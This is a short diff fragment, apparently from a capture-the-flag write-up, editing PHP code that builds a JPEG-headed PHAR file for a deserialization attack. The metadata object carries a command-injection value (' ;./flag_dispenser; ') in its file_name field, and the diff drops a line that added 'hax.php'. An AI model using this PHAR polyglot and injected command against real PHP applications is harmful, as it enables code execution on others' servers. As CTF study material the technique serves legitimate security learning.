@@ -125,7 +125,6 @@ $phar->setStub($jpeg_header_size." __HALT_COMPILER(); ?>");
 $object = new Image('hack.png');
 $object->file_name = " ;./flag_dispenser; ";
 $phar->setMetadata($object);
-$phar->addFile("./hax.php");
 $phar->stopBuffering();
 ```
 
